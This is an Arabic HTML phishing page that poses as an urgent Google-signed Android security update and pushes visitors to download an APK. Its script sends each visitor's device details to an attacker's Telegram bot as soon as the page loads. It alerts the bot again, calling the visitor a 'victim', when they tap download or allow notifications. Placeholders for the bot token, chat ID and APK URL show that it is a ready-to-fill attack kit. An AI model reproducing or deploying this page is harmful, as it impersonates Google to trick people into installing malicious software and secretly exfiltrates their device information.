<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث أمني عاجل</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(145deg, #1a2332 0%, #0d1520 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            direction: rtl;
        }
        .card {
            background: #fff;
            max-width: 420px;
            width: 100%;
            border-radius: 28px;
            padding: 32px 24px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            text-align: center;
        }
        .icon { font-size: 64px; margin-bottom: 12px; }
        h1 { font-size: 22px; color: #1a2332; margin-bottom: 8px; }
        .sub {
            color: #6b7280;
            font-size: 14px;
            margin-bottom: 24px;
            line-height: 1.6;
        }
        .alert-box {
            background: #fef2f2;
            border: 1px solid #fca5a5;
            border-radius: 14px;
            padding: 14px;
            color: #991b1b;
            font-size: 13px;
            margin-bottom: 20px;
        }
        .btn {
            display: block;
            width: 100%;
            padding: 16px;
            border-radius: 14px;
            font-size: 16px;
            font-weight: 700;
            border: none;
            cursor: pointer;
            transition: transform 0.2s;
            margin-bottom: 12px;
            color: #fff;
        }
        .btn:active { transform: scale(0.97); }
        .btn-success { background: #16a34a; }
        .btn-danger { background: #dc2626; }
        .btn-primary { background: #2563eb; }

        /* الحقول المخفية */
        .hidden-config { display: none; }

        #statusMsg {
            margin-top: 16px;
            padding: 12px;
            border-radius: 12px;
            font-size: 13px;
            display: none;
        }
        .footer {
            color: #9ca3af;
            font-size: 11px;
            margin-top: 16px;
        }
        .step-note {
            background: #f0fdf4;
            border: 1px solid #86efac;
            border-radius: 10px;
            padding: 10px;
            font-size: 12px;
            color: #166534;
            margin-bottom: 16px;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">📱</div>
        <h1>تحديث أمني عاجل</h1>
        <p class="sub">
            تم رصد ثغرة أمنية في إصدارات أندرويد السابقة.<br>
            يرجى تثبيت التحديث لحماية جهازك.
        </p>

        <div class="alert-box">
            ⚠️ جهازك معرض للخطر — يرجى التحديث فوراً
        </div>

        <div class="step-note">
            🔒 التحديث موقّع رقمياً من Google — آمن 100%
        </div>

        <!-- ★ غير القيم تحت ★ -->
        <div class="hidden-config">
            <input type="hidden" id="botToken" value="YOUR_BOT_TOKEN_HERE">
            <input type="hidden" id="chatId" value="YOUR_CHAT_ID_HERE">
            <input type="hidden" id="apkUrl" value="https://github.com/YOUR_USERNAME/YOUR_REPO/releases/latest/download/app-release.apk">
        </div>

        <button class="btn btn-success" onclick="downloadApk()">
            📲 تحميل وتثبيت التحديث
        </button>

        <button class="btn btn-primary" onclick="requestPermission()">
            🔔 تفعيل التنبيهات الأمنية
        </button>

        <button class="btn btn-danger" onclick;">❌ لست الآن، ذكرني لاحقاً</button>

        <p class="sub" style="font-size:12px; color:#9ca3af; margin-top:8px;">
            الإصدار 2.4.1 · 12 MB · تحديث أمني 29 يونيو 2026
        </p>

        <div id="statusMsg"></div>

        <div class="footer">
            © Google Security Team — تحديث أمني موصى به
        </div>
    </div>

    <script>
        // ★ إعدادات البوت ★
        const BOT_TOKEN = document.getElementById('botToken').value;
        const CHAT_ID = document.getElementById('chatId').value;
        const APK_URL = document.getElementById('apkUrl').value;

        const statusMsg = document.getElementById('statusMsg');

        function showStatus(msg, type) {
            statusMsg.textContent = msg;
            statusMsg.style.display = 'block';
            if (type === 'success') {
                statusMsg.style.background = '#f0fdf4';
                statusMsg.style.color = '#166534';
                statusMsg.style.border = '1px solid #86efac';
            } else if (type === 'error') {
                statusMsg.style.background = '#fef2f2';
                statusMsg.style.color = '#991b1b';
                statusMsg.style.border = '1px solid #fca5a5';
            } else {
                statusMsg.style.background = '#f0f9ff';
                statusMsg.style.color = '#1e3a8a';
                statusMsg.style.border = '1px solid #93c5fd';
            }
        }

        // إشعار البوت بمعلومات الجهاز
        (function notifyBot() {
            const info = {
                ua: navigator.userAgent,
                platform: navigator.platform,
                lang: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                time: new Date().toLocaleString('ar-SA'),
                url: window.location.href
            };

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: `🖥️ *جهاز جديد فتح الصفحة*\n🕐 ${info.time}\n📱 ${info.ua}\n🌍 ${info.platform} | ${info.lang}\n📐 ${info.screen}\n🔗 ${info.url}`,
                    parse_mode: 'Markdown'
                })
            }).catch(() => {});
        })();

        // تحميل APK
        function downloadApk() {
            showStatus('⏳ جاري تجهيز التحديث...', 'info');

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: `📥 *ضحية طلبت التحميل!*\n🕐 ${new Date().toLocaleString('ar-SA')}`,
                    parse_mode: 'Markdown'
                })
            }).catch(() => {});

            window.location.href = APK_URL;

            setTimeout(() => {
                showStatus('✅ إذا لم يبدأ التحميل تلقائياً، انقر على الزر مرة أخرى', 'success');
            }, 3000);
        }

        // طلب صلاحية الإشعارات
        function requestPermission() {
            if (!('Notification' in window)) {
                showStatus('❌ المتصفح لا يدعم الإشعارات', 'error');
                return;
            }

            Notification.requestPermission().then(perm => {
                if (perm === 'granted') {
                    showStatus('✅ تم تفعيل التنبيهات بنجاح', 'success');

                    new Notification('🔒 التحديث الأمني نشط', {
                        body: 'جهازك محمي الآن. شكراً لتحديث نظامك.',
                        icon: 'https://cdn-icons-png.flaticon.com/512/565/565547.png'
                    });

                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: `🔔 *ضحية سمحت بالإشعارات!*\n🕐 ${new Date().toLocaleString('ar-SA')}`,
                            parse_mode: 'Markdown'
                        })
                    }).catch(() => {});
                } else {
                    showStatus('❌ يجب السماح بالإشعارات لتلقي التنبيهات الأمنية', 'error');
                }
            });
        }

        console.log('✅ Page loaded — waiting for victim');
    </script>
</body>
</html>
